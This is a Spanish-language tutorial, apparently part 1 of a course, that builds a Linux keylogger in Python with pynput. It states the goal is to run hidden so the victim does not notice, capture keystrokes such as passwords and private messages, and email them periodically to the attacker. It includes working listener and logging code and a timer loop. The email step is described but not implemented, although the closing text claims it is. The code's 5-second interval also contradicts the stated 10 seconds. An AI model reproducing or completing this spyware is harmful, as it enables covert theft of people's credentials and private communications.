
--- 
- TAG: #Desarrollo #Keylogger #Parte1 
-----
En esta clase, nos adentraremos en la creación de un **keylogger**, una herramienta fundamental en el mundo de la ciberseguridad ofensiva. Para esto, utilizaremos la biblioteca **pynput** de Python, que es una herramienta efectiva para monitorear y registrar las pulsaciones de teclado.

**Pynput** es una biblioteca que nos permite controlar y monitorear la entrada del usuario desde el teclado y el ratón. En el contexto de un keylogger, nos centraremos en la capacidad de pynput para registrar cada tecla presionada en el teclado. Esto es especialmente útil en escenarios de ciberseguridad ofensiva, donde la recopilación de pulsaciones de teclas puede revelar información sensible como contraseñas, mensajes privados o cualquier otro tipo de datos ingresados a través del teclado.

El aspecto clave de esta clase será no solo registrar estas pulsaciones, sino también aprender a enviar esta información de manera automática y discreta por correo electrónico. Esto implica configurar un sistema que agrupe las pulsaciones de teclas capturadas y las envíe periódicamente a una dirección de correo electrónico especificada. Esta funcionalidad aumenta la eficacia del keylogger, permitiéndonos acceder a la información capturada de forma remota y continua, lo cual es crucial para operaciones prolongadas de vigilancia o recopilación de datos.

Te guiaremos a través de todo el proceso de configuración del keylogger, desde la captura de las pulsaciones de teclas hasta la implementación del sistema de envío de correos electrónicos, proporcionándote una comprensión completa de cómo se pueden utilizar estas herramientas en escenarios de ciberseguridad ofensiva.

---

**Creación de un Keylogger en Python**

La idea es crear un script en **Python** específico para Linux que corra en segundo plano, sin que la víctima se dé cuenta. Mientras tanto, en paralelo, interceptamos todas sus pulsaciones y, además de capturarlas, las enviamos por correo electrónico.

Cuando ejecutemos este **Keylogger**, nos llegará un primer correo que diga "Primer keylogger iniciado" y luego, en intervalos de 10 segundos, recibiremos una cadena con lo que el usuario vaya introduciendo.

Para este ejemplo, podemos usar un correo temporal o personal, pero debemos tener en cuenta que es necesario activar el doble factor de autenticación. Esto se debe a que el envío de correos por Python ya no acepta solo el usuario y contraseña; en su lugar, crearemos una aplicación vinculada a nuestra cuenta de correo con una contraseña asignada. Esta aplicación actuará como intermediario y enviará los correos a nuestra cuenta de Gmail.

---

# Creación de un Keylogger en Python para Linux

## Descripción del Proyecto

La idea es crear un script en **Python** específico para Linux, que corra en segundo plano y esté de fondo sin que la víctima se dé cuenta. Mientras tanto, en paralelo, interceptará todas sus pulsaciones y no solo las capturará, sino que también nos las enviará por correo.

De manera que, cuando ejecutemos este **Keylogger**, nos llegará un primer correo que dirá "Primer keylogger iniciado", y luego, después de intervalos de 10 segundos, nos llegará la cadena de lo que el usuario vaya introduciendo.

## Preparativos

Para este ejemplo, podemos usar un correo temporal o el personal, pero hay que tener en cuenta que debe estar activado el doble factor de autenticación, porque el envío de correos por Python ya no acepta solo el usuario y la contraseña. Así que lo ideal sería crear una aplicación como tal, y a esta aplicación, a través de una contraseña asignada, la vincularemos a nuestro script para que actúe de intermediario y envíe el correo a nuestra cuenta de Gmail.

---

# Creación del Archivo **keylogger.py**

Nos dirigimos a nuestro entorno de trabajo y creamos el archivo **keylogger.py**:

```python
#!/usr/bin/python3

import pynput.keyboard

def pressed_key(key):
	print(key)

keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
	keyboard_listener.join()
```

---

# Instalación de la Librería `pynput`

Es posible que **pynput** no esté instalado, ya que Python no lo incluye por defecto. Para instalarlo, primero deben ejecutar el siguiente comando:

```bash
pip3 install pynput
```

---

# Explicación del Script

Lo primero que hemos hecho es crear un **listener**, es decir, nos ponemos en escucha continuamente por pulsaciones.

1. Creamos una instancia de la clase `Listener` que viene en **pynput.keyboard**: `pynput.keyboard.Listener(on_press=pressed_key)`.
2. `pressed_key` es la función que va a recibir las pulsaciones.
3. Ahora, al **listener**, tenemos que ponerlo en escucha con `with keyboard_listener:`.
4. Esta clase crea un manejador de contexto para internamente definir toda la operatoria. En este caso, queremos arrancar el **listener** con `.join`.

---

# Prueba del Keylogger

Podemos hacer una pequeña prueba para ver si todo va bien. Ejecútalo con el siguiente comando:

```bash
python3 keylogger.py
```

Y en otra terminal, comenzamos con las pulsaciones. Hemos creado un pequeño **keylogger**, pero el formato de salida no es el ideal, ya que representa algo así:

```
h
o
l
a
p
r
o
b
a
n
d
o
```

---

# Mejorando el Formato de Salida

Vamos a mejorar el formato creando una variable global `log` donde almacenaremos todos los caracteres. Ten en cuenta que el `log` dentro de la función `pressed_key` es un valor distinto, ya que está dentro del ámbito de la función.

Para eliminar las comillas simples y ver un mejor resultado, podemos usar `key.char`.

### Manejo de Excepciones

Incluimos una excepción de tipo `AttributeError` para evitar errores al momento de ejecutar combinaciones como `Ctrl + Enter`. De esta manera, manejamos el error correctamente.

En la excepción, podemos indicar que si la tecla es un espacio, el `log` debe ser `log += " "` (un espacio), lo que representa textualmente la tecla específica.

Refactorizaremos las excepciones para tener un mejor control y visualización del código.

---

# Enviando el Log por Correo

Para enviar el log cada 10 segundos, lo enviamos por correo. Después de enviarlo, limpiamos el `log` para recibir nuevos caracteres y enviar el contenido de nuevo al correo, sin que la víctima lo note.

### Uso de Hilos y Temporizadores

En este punto, entran en juego los **hilos**. Vamos a utilizar la utilidad de **threading** llamada **timers**, que nos permite ejecutar una función en intervalos regulares.

Una función recursiva es aquella que se llama a sí misma. Así que, en el manejador de contexto de nuestro propio **listener**, estaremos en escucha de nuevas pulsaciones y, en paralelo, llamaremos a la función `report()`.

La función `report()` se encargará de vaciar el contenido del log y enviarlo por correo. Para asegurarnos de que funcione correctamente, primero mostramos lo que vale el `log`, introducimos caracteres y verificamos si cada 10 segundos el log se limpia.

### Implementación del Timer

Incluimos la función **timer**, que se encargará de ejecutar la función cada cierto intervalo de tiempo.

```python
#!/usr/bin/python3

import pynput.keyboard
import threading

log = ""

def pressed_key(key):
	global log

	try:
		log += str(key.char)

	except AttributeError:
		special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
		log += special_keys.get(key, f" {str(key)} ")

	print(log)

def report():
	global log
	log = ""

	timer = threading.Timer(5, report)
	timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
	report()
	keyboard_listener.join()
```

---

Con estos cambios, el **keylogger** no solo captura las pulsaciones, sino que también envía la cadena por correo cada 10 segundos y limpia el log para seguir capturando nuevas entradas.

---
